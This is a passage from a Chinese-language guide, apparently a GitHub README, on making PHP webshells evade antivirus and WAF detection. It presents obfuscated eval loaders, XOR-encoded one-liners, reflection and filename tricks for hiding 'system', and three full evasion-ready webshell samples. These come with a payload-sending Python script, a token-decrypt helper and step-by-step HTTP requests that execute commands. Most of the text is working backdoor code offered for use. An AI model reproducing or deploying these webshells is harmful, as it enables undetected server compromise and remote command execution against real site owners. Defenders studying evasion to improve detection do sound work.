            print(result[0])

for upper_case in string.ascii_uppercase:
    for result in results:
        if upper_case in result:
            print(result[0])
```

### 8.2 嵌套运算

其实嵌套运算在WebShell免杀中算是常客了，让我们来看一下一个 `phpinfo()` 的嵌套运算

```php
$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};

eval($O00O0O("JE8wTzAwMD0iU0VCb1d4VGJ2SGhRTnFqeW5JUk1jbWxBS1lrWnVmVkpVQ2llYUxkc3J0Z3dGWER6cEdPUFdMY3NrZXpxUnJBVUtCU2hQREdZTUZOT25FYmp0d1pwYVZRZEh5Z0NJdnhUSmZYdW9pbWw3N3QvbFg5VEhyT0tWRlpTSGk4eE1pQVRIazVGcWh4b21UMG5sdTQ9IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));
```

加密手法可以看我写的博客： [https://blog.zgsec.cn/archives/147.html](https://blog.zgsec.cn/archives/147.html) 

## 9# 传参绕过

将恶意代码不写入文件，而是通过传参传入，所以这个比较难以被常规WAF所识别

### 9.1 Base64传参

```php
$decrpt = $_REQUEST['a'];
$decrps = $_REQUEST['b'];
$arrs = explode("|", $decrpt)[1];
$arrs = explode("|", base64_decode($arrs));
$arrt = explode("|", $decrps)[1];
$arrt = explode("|", base64_decode($arrt)); call_user_func($arrs[0],$arrt[0]);
```

传参内容：

```php
a=c3lzdGVt    //system的base64加密
b=d2hvYW1p    //whoami的base64加密
```

也可以尝试使用其他编码或者加密方式进行传参

### 9.2 函数构造传参

可以用一些定义函数的函数来进行传参绕过，比如使用 `register_tick_function()` 这个函数

```php
register_tick_function ( callable $function [, mixed $... ] ) : bool
```

例子如下：

```php
$f = $_REQUEST['f'];
declare(ticks=1);
register_tick_function ($f, $_REQUEST['aabyss']);
```

## 10# 自定义函数绕过

通过自定义函数，将恶意代码内容隐藏于自定义函数当中，再进行拼接执行

### 10.1 简单自定义函数

这个要与其他的姿势进行结合，目前没办法通过简单自定义函数进行免杀

```php
function out($b){
    return $b;
}
function zhixin($a){
    return system($a);
}
function post(){
    return $_POST['aabyss'];
}

function run(){
    return out(zhixin)(out(post()));
}

run();
```

### 10.2 读取已定义函数


获取某个类的全部已定义的常量，不管可见性如何定义

```php
public ReflectionClass::getConstants(void) : array
```

例子如下：

```php
class Test
{
    const a = 'Sy';
    const b = 'st';
    const c = 'em';
    
    public function __construct(){
    }
}

$para1;
$para2;
$reflector = new ReflectionClass('Test');

for ($i=97; $i <= 99; $i++) {
    $para1 = $reflector->getConstant(chr($i));
    $para2.=$para1;
}

foreach (array('_POST','_GET') as $_request) {
    foreach ($$_request as $_key=>$_value) {
        $$_key=  $_value;
    }
}

$para2($_value);
```

## 11# 读取字符串绕过

重点还是放在高危函数上，通过读取各种东西来获得对应字符串

### 11.1 读取注释

这里用到读取注释的函数

```php
ReflectionClass::getDocComment
```

例子如下：

```php
    /**   
    * system($_GET[aabyss]);
    */  
class User { }  
$user = new ReflectionClass('User');
$comment = $user->getDocComment();
$f = substr($comment , 14 , 22);
eval($f);
```

### 11.2 读取数据库

可以通过 `file_put_contents` 文件写入函数写入一个Sqlite的数据库

```php
$datatest = "[文件的base64编码]";
file_put_contents('./要写入的文件名', base64_decode($datatest));
```

然后通过PHP读取数据库内容提取高危函数，从而达到WebShell免杀效果

```php
$path = "数据库文件名"

$db = new PDO("sqlite:" . $path);

$sql_stmt = $db->prepare('select * from test where name="system"');
$sql_stmt->execute();

$f = substr($sql_stmt->queryString, -7, 6);
$f($_GET['b']);
```

### 11.3 读取目录

`FilesystemIterator` 是一个迭代器，可以获取到目标目录下的所有文件信息

```php
public FilesystemIterator::next ( void ) : void
```

可以尝试使用 `file_put_contents` 写入一个名为 `system.aabyss` 的空文件，然后遍历目录拿到字符串 `system` ，成功ByPass

```php
$fi = new FilesystemIterator(dirname(__FILE__));
$f = '';
foreach($fi as $i){
    if (substr($i->__toString(), -6,6)=='aabyss')  //判断后缀名为.aabyss的文件（其他特殊后缀也行）
        $f = substr($i->__toString(), -13,6);      //从system.aabyss提取出system高危函数
}
$f($_GET['b']);
```

为什么要写入为 `system.aabyss` 这个文件名呢，因为特殊后缀能让代码快速锁定文件，不至于提取文件名提取到其他文件了

## 12# 多姿势配合免杀

将以上提到的相关姿势，进行多种配合嵌套，实现免杀效果

### 12.1 样例一

刚开始看这个样例我还是挺惊讶的，仔细分析了一波，发现还是挺简单的，但重在思路

这个样例使用了异或+变换参数的手法，成功规避了正则匹配式，具有实战意义

```php
<?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);
```
这时候，就可以执行GET传参：`?_=system&__=whoami` 来执行whoami命令

由8.1讲到PHP中如何异或，我们就先把最前面这部分拆出来看看
```php
<?=~$_='$<>/'^'{{{{';
//即 '$<>/' ^ '{{{{'
//即 "$<>/" 这部分字符串与后面 "{{{{" 这部分字符串异或
```
所以由我们前面所学的知识，加上自己动手实践一下，可以发现异或结果为 `_GET`

所以整个PHP语句解密后，再将 `_` 替换为 `a`，将 `__` 替换为 `b`，则原PHP转化为：
```php
$_GET['a']($_GET['b'])
```
当我们给 `a` 传 `system`，给 `b` 传 `whoami`，原式就会变成这样
```php
system('whoami');
```

既然上面的代码你看懂了，那不妨看一下下面魔改的代码：
```php
<?=~$_='$<>/'^'{{{{';$___='$}4(/' ^ '{-{{{';@${$_}[_](@${$___}[__]);
```
直接用 Godzilla 哥斯拉来连接，如下：

![魔改连接哥斯拉.png](https://blog.zgsec.cn/usr/uploads/2023/06/432722789.png)

当然这里使用到 `assert` 高危函数，只能用于 `php` 在 `5.*` 的版本，相关姿势读者不妨自行拓展一下哈哈~

### 12.2 样例二

这个免杀马是最近捕获到的，可以轻松过D盾、阿里云等一众查杀引擎~

![ll0sxg0e.png](https://blog.zgsec.cn/usr/uploads/2023/08/3308306080.png)

![ll0sx462.png](https://blog.zgsec.cn/usr/uploads/2023/08/3184468024.png)

这个样例使用了字符串截取+编解码转换+参数回调的手法，成功规避了正则匹配式，具有实战意义

```php
<?php
phpinfo();
class Car{
	function encode(){
		$num1=base64_encode($_POST['num']);
		$num=base64_decode($num1);
		echo "1";
		foreach($_POST as $k => $v){
			$_POST[$k] = pack("H*",(substr($v,$num,-$num)));
		}
		@$post=base64_encode($_POST['Qxi*37yz']);
		@$post1=base64_decode(@$post);
		return $post1;
	}
	function Xt(){
		return eval($this->encode());
	}
}
$t=new Car;
$t->Xt();
?>
```
这时候，就可以执行POST传参：`num=2&Qxi*37yz=6173797374656d282777686f616d6927293b62` 来执行whoami命令

这个PHP内定义了两个函数，分别是 `encode()` 和 `Xt()`，我们先看 `encode()`：

```php
function encode(){
	$num1=base64_encode($_POST['num']);
	$num=base64_decode($num1);
	echo "1";
	foreach($_POST as $k => $v){
		$_POST[$k] = pack("H*",(substr($v,$num,-$num)));
	}
	@$post=base64_encode($_POST['Qxi*37yz']);
	@$post1=base64_decode(@$post);
	return $post1;
}
```
传入了两个参数，参数名分别为 `num` 和 `Qxi*37yz`，这个函数的输出为 `$post1`，关键就在于以下这一行代码：

```php
foreach($_POST as $k => $v){
	$_POST[$k] = pack("H*",(substr($v,$num,-$num)));
}
```
然后我们根据上文提到的知识点0.8、1.5和2.1以及2.4，可以了解到这一行代码的意思：

- `substr()` 函数将传进去的 `Qxi*37yz` 参数字符串，删掉前 `num` 个字符和后 `num` 个字符（截取中间部分的内容）
- `pack("H*",...)` 函数将处理后的 `Qxi*37yz` 参数字符串进行十六进制编码转换
- `foreach()` 将原本的 `$_POST` 变量替换为经过十六进制编码转换后的字符串

注：这里可能有些绕，多上手尝试一下就明白了

接下来我们来看 `Xt()` 这个函数：

```php
function Xt(){
	return eval($this->encode());
}
```
它将 `encode()` 函数的执行结果带入到 `eval()` 高危函数当中，即：

```php
function Xt(){
	return eval($post1);  //encode()函数的输出为$post1
}
```
那假设我们要执行 `whoami` 命令，那就要让 `$post1` 等于 `system('whoami');`，这没毛病吧？

所以结合来看，我们先要生成16进制的字符串：

![whoami转十六进制.png](https://blog.zgsec.cn/usr/uploads/2023/08/3506909610.png)

但眼尖的师傅可能会发现，为什么最前面要加个 `a` 以及最后面要加个 `b` 呢？
那是因为上面有 `substr()` 函数啊，会删掉前 `num` 个字符和后 `num` 个字符（截取中间部分的内容），小傻瓜~所以现在懂了吗？

所以整体参数的传参流程如下：

![参数传参流程.png](https://blog.zgsec.cn/usr/uploads/2023/08/4099814745.png)

- 刚开始传入参数：`num`=`2`，`Qxi*37yz`=`6173797374656d282777686f616d6927293b62`
- 第一步：先根据 `substr()`，从num=2开始截取到倒数第2位，于是 `Qxi*37yz` 便等于 `73797374656d282777686f616d6927293b`
- 第二步：再根据 `pack("H*",...)`，将 `Qxi*37yz`=`73797374656d282777686f616d6927293b` 从16进制转为字符串即 `system('whoami');`
- 第三步：最后根据 `foreach()`，将内容返还给原本的值，使得 `encode()` 函数的输出变量 `$post1` 为 `system('whoami');`
- 第四步：再在 `Xt()` 函数当中，用 `eval()` 高危函数执行php语句 `system('whoami');`,便成功执行系统命令 `whoami`

当然这个PHP木马也能用蚁剑来连接，前提是需要写一个编码器，如果你懂原理了，相信你分分钟就能写出来~

这里的话，微信的 `@Elvery` 师傅还写了一个直接生成Payload一键传参的Python脚本，师傅们可以参考一下：
```python
import requests
import base64

# 指定num参数和要执行的PHP代码
num = 5
php_code = 'echo "Hello, world!";'

# 把PHP代码转换为十六进制字符串
hex_code = php_code.encode().hex()

# 在字符串的开头和结尾加上num个任意字符
encoded_code = 'a'*num + hex_code + 'a'*num

# 发送POST请求
response = requests.post('http://your-target-url/path-to-php-file.php', data={
    'num': num,
    'Qxi*37yz': encoded_code,
})

# 打印服务器的响应
print(response.text)
```

![样例二成功执行命令.png](https://blog.zgsec.cn/usr/uploads/2023/08/2146327561.png)

### 12.3 样例三

这个免杀马是在近期某大型攻防演练中捕获到的，也是能过一众查杀引擎~
这个样例使用了异或+编解码转换+参数加解密回调+密钥协商的手法，成功规避了语义分析和正则匹配式，具有实战意义

这个WebShell和冰蝎马等具有相似性，各位师傅不妨可以看看原理：

```php
<?php
session_start();

function set_token($v,$t) {
	$r="";
	for ($x=0; $x<strlen($v);$x++) {
		if(($x+1)%strlen($t)!=0) {
			$r.=chr(ord(substr($v,$x,$x+1))^ord(substr($t,$x%strlen($t),($x+1) % strlen($t))));
		} else {
			$r.=chr(ord(substr($v,$x,$x+1))^ord(substr($t,$x%strlen($t),16)));
		}
	}
	return $r;
}

if (isset($_SERVER["HTTP_TOKEN"])) {
	$t=substr(md5(rand()),16);
	$_SESSION['token']=$t;
	header('Token:'.$_SESSION['token']);
} else {
	if(!isset($_SESSION['token'])) {
		return;
	}
	$v=$_SERVER['HTTP_X_CSRF_TOKEN'];
	$b='DQHNGW'^'&0;+qc';
	$b.= '_dec'.chr(111).'de';
	$v=$b($v."");
	
	class E {
		public function __construct($p) {
			$c=('ZSLQWR'^'82?4af')."_d"."eco".chr(108-8)."e";
			$e = $c($p);
			eval(null.$e."");
		}
	}
	@new E(set_token($v, $_SESSION['token']));
}
```

这个WebShell要如何执行命令呢？共需要三步，请看我细细分析~

首先，这个函数定义了一个函数 `set_token()` 和一个类 `class E`，但我们不着急看，我们先看PHP先执行的部分：

```php
if (isset($_SERVER["HTTP_TOKEN"])) {
	$t=substr(md5(rand()),16);
	$_SESSION['token']=$t;
	header('Token:'.$_SESSION['token']);
} else {
	if(!isset($_SESSION['token'])) {
		return;
	}
	$v=$_SERVER['HTTP_X_CSRF_TOKEN'];
	$b='DQHNGW'^'&0;+qc';
	$b.= '_dec'.chr(111).'de';
	$v=$b($v."");
}
```

由1.6讲到的知识点，结合PHP代码可得：

>if (!isset($_SESSION['token'])) 这行代码首先检查当前会话（session）中是否存在名为 "token" 的变量。
>$_SESSION 是用于在PHP中存储会话数据的关联数组，通常用于在不同页面之间共享数据。isset函数用于检查变量是否已经被设置，如果变量存在并且有值，返回 true，否则返回 false。

所以根据知识点，我们要先给服务器发一个 `Token` 值，这样就可以进入IF，服务器就会生成一个随机的令牌（token）并将其存储在会话（session）中，并通过HTTP头部返回给客户端

但 `Token` 只需要获取一次就行了，因为服务器生成并返还令牌（token）后，会存在会话（session）中，简单理解就是服务器的内存当中，后续的使用就不要添加`Token` 值了
 **【因为如果再获取，令牌（token）又会重新生成，就无法进入else的后续步骤，这一步可能有点绕，不明白的师傅不妨上手实践一下哈哈】** 

```php
$v=$_SERVER['HTTP_X_CSRF_TOKEN'];
$b='DQHNGW'^'&0;+qc';
$b.= '_dec'.chr(111).'de';
$v=$b($v."");
```

由8.1讲到的异或和0.1讲到的拼接赋值，以上代码可转化为：

```php
$v = $_SERVER['HTTP_X_CSRF_TOKEN'];
$b = "base64_decode";
$v = $b($v."");
```

意思就是，从HTTP请求头获取名为 "HTTP_X_CSRF_TOKEN" 的值，并进行Base64解密再讲值重新赋给 `$v`

接下来我们再来看类 `class E` :

```php
class E {
		public function __construct($p) {
			$c=('ZSLQWR'^'82?4af')."_d"."eco".chr(108-8)."e";
			$e = $c($p);
			eval(null.$e."");
		}
	}
```

同样根据相关知识点，我们可以将以上代码转化为以下：

```php
class E {
		public function __construct($p) {
			$c = "base64_decode";
			$e = $c($p);
			eval(null.$e."");
		}
	}
```

意思就是类 `class E` 接受一个参数 `$p`，将其通过Base64解密后，放入高危函数 `eval` 内执行
 **那我们想要成功执行命令，就必须控制 `$p` 的传入值** 

那我们看看所谓的 `$p` 是从哪里传入的吧：

```php
@new E(set_token($v, $_SESSION['token']));
```

由此可知，`$p` 为 `set_token($v, $_SESSION['token'])` 的执行结果，所以我们要控制 `set_token($v, $_SESSION['token'])` 的内容才能成功执行命令

- `$v` 参数：从HTTP请求头获取名为 "HTTP_X_CSRF_TOKEN" 的值，并进行Base64解密再讲值重新赋给 `$v`
- `$_SESSION['token']` 参数：给服务器发一个 `TOKEN` 值，会生成一个随机的令牌（token）并将其存储在会话（session）中，并通过HTTP头部返回给客户端

明白了两个参数都是从哪来的之后，我们再来看函数 `set_token()`：

```php
function set_token($v,$t) {
	$r="";
	for ($x=0; $x<strlen($v);$x++) {
		if(($x+1)%strlen($t)!=0) {
			$r.=chr(ord(substr($v,$x,$x+1))^ord(substr($t,$x%strlen($t),($x+1) % strlen($t))));
		} else {
			$r.=chr(ord(substr($v,$x,$x+1))^ord(substr($t,$x%strlen($t),16)));
		}
	}
	return $r;
}
```

简单来说，函数 `set_token($v, $t)` 就是一个加密算法，作用是根据输入的两个字符串 `$v` 和 `$t`，返回一个新的字符串 `$r`
该函数采用异或（XOR）操作对两个字符串的每个字符进行逐一处理，并将结果拼接成新的字符串返回

而返回的 `$r` 变量，最终会传入 `@new E($r)`，进行Base64解密并放入高危函数 `eval` 内执行

打个比方，假设我们想执行系统命令 `whoami`，那 `$r` 变量就应该是 `system('whoami'); ` Base64加密后的字符串 `c3lzdGVtKCd3aG9hbWknKTsg`
而 `$r` 变量又是 `set_token($v, $_SESSION['token'])` 的加密结果，看上去很清晰，那目前我们的困境是什么？

那就是我们不知道 `$v` 应该传什么值！！！我们目前只知道 `$t=>$_SESSION['token']` 和执行的最终结果 `$r=>c3lzdGVtKCd3aG9hbWknKTsg`，那我们能不能通过这两个变量获得 `$v`呢，当然可以！！！

```php
<?php
function decrypt_token($r, $t) {
    $v = "";
    for ($x = 0; $x < strlen($r); $x++) {
        if (($x + 1) % strlen($t) != 0) {
            $v .= chr(ord(substr($r, $x, $x + 1)) ^ ord(substr($t, $x % strlen($t), ($x + 1) % strlen($t))));
        } else {
            $v .= chr(ord(substr($r, $x, $x + 1)) ^ ord(substr($t, $x % strlen($t), 16)));
        }
    }
    return $v;
}

// 已知的 $t 和 $r 的值
$t = $_POST['token'];  //已知的 $t 的值
$r = $_POST['out'];  //"c3lzdGVtKCd3aG9hbWknKTsg" 已知的 $r 的值

// 解密已知的 $r 值得到 $v
$v = decrypt_token($r, $t);
echo base64_encode($v);
```

通过编写这么一段代码，调换了一下顺序，就可以通过 `$t=>$_SESSION['token']` 和 `$r=>c3lzdGVtKCd3aG9hbWknKTsg`，拿到参数 `$v`

至此，整条利用链已经清晰，我们来复现一下吧：

#### 12.3.1 第一步、密钥协商得到Token

对WebShell进行发包，`Token` 随便填啥都行

```http
GET /muma.php HTTP/1.1
Host: test.ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Token: 1
Content-Length: 0

```

在返回包中可以看到服务器生成的 `Token` 值和 `Cookie` 值

![样例三-1.png](https://blog.zgsec.cn/usr/uploads/2023/09/3979805148.png)

#### 12.3.2 第二步，得到X-CSRF-TOKEN

假设我们想执行系统命令 `whoami`，PHP代码就是 `system('whoami'); `，对其进行Base64加密后的字符串 `c3lzdGVtKCd3aG9hbWknKTsg`，当然你想执行其他的命令也行哈哈

```http
POST /decode.php HTTP/1.1
Host: test.ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

token=a2b3fca92539495e&out=c3lzdGVtKCd3aG9hbWknKTsg
```

然后通过上文写的解密PHP，通过第一步获得的 `Token` 值和最终Base64加密后的字符串 `c3lzdGVtKCd3aG9hbWknKTsg`，拿到得到 `X-CSRF-TOKEN`

![样例三-2.png](https://blog.zgsec.cn/usr/uploads/2023/09/1178498786.png)

 **注：这不是对WebShell发包，而是我上面写的解密PHP `decode.php` 来进行解密** 

#### 12.3.3 第三步，利用木马成功执行命令

现在已经拿到 `X-CSRF-TOKEN` 和 `Cookie` 了，那就直接发包即可

```http
POST /muma.php HTTP/1.1
Host: test.ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=6g4sgte2t8nnv65u8er5cfdtnq;
X-CSRF-TOKEN: AgEOSQIkN015dlcKVX4MDQNlCV0tNxJe
Content-Length: 0

```

可以看到，成功执行系统命令 `whoami` 了

![样例三-3.png](https://blog.zgsec.cn/usr/uploads/2023/09/3688888416.png)

所以你学废了吗？更多有趣的WebShell免杀案例等我后续更新~


# 四，总结

上面分享了诸多姿势，重点还是灵活依靠思路和姿势，通过活用各种特性和函数来和WAF对抗，相信你自己也可以的！

在写这个整理的文档的时候，也收获颇多，希望各位师傅能认真研读，小人不才望大佬多加指正

其实在我个人的眼里，安全对抗其实就是人与人之间的灵魂、思维在碰撞和对抗，我一直执着于这个过程，也欢迎各位师傅和我互相学习、共同进步哈哈~



我的个人Github： [https://github.com/AabyssZG/](https://github.com/AabyssZG/) 

最后，也欢迎各位师傅关注我们团队公众号啦

![微信公众号.png](https://blog.zgsec.cn/usr/uploads/2023/03/2621060550.bmp)


# 五，感谢各位师傅

## Stargazers

[![Stargazers repo roster for @AabyssZG/WebShell-Bypass-Guide](https://reporoster.com/stars/AabyssZG/WebShell-Bypass-Guide)](https://github.com/AabyssZG/WebShell-Bypass-Guide/stargazers)


## Forkers

[![Forkers repo roster for @AabyssZG/WebShell-Bypass-Guide](https://reporoster.com/forks/AabyssZG/WebShell-Bypass-Guide)](https://github.com/AabyssZG/WebShell-Bypass-Guide/network/members)


## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=AabyssZG/WebShell-Bypass-Guide&type=Date)](https://star-history.com/#AabyssZG/WebShell-Bypass-Guide&Date)

